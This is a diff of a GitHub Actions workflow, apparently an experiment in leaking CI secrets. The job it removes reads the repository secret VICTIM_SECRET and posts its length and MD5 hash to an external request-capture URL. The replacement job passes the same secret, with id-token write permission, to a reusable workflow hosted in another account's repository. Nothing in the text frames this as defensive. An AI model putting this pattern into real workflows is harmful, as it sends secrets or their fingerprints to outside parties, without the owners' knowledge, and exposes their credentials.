@@ -3,18 +3,10 @@ on:
   workflow_dispatch:
   push:
 jobs:
-  local_diag:
-    runs-on: ubuntu-latest
-    steps:
-      - name: same-owner local read of own secret
-        env:
-          S: ${{ secrets.VICTIM_SECRET }}
-        run: |
-          LEN=${#S}
-          MD=$(printf "%s" "$S" | md5sum | cut -d" " -f1)
-          curl -s -X POST "https://ttstaqwtq.free.beeceptor.com" -H "Content-Type: application/json" --data "{\"diag\":\"LOCAL-SAME-OWNER\",\"secret_len\":$LEN,\"secret_md5\":\"$MD\"}"
-  call:
+  deploy:
     permissions:
       contents: write
+      id-token: write
     uses: hmz-latest-new2/.github/.github/workflows/reusable.yml@main
-    secrets: inherit
+    secrets:
+      DEPLOY_SECRET: ${{ secrets.VICTIM_SECRET }}
